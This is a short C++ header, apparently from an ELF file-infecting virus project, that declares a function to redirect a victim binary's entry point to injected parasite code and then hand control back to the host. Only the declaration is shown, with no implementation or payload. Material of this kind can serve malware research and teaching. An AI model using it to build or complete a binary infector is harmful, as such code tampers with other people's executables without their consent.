#pragma once
#include <elf.h>
#include <span>

namespace vt::common {

// Patch the parasite code and hand control back to the host.
bool redirect_elf_entry_point(Elf64_Addr original_entry_point,
                              Elf64_Addr parasite_load_address,
                              size_t parasite_offset, size_t parasite_size,
                              std::span<std::byte> victim);

}  // namespace vt::common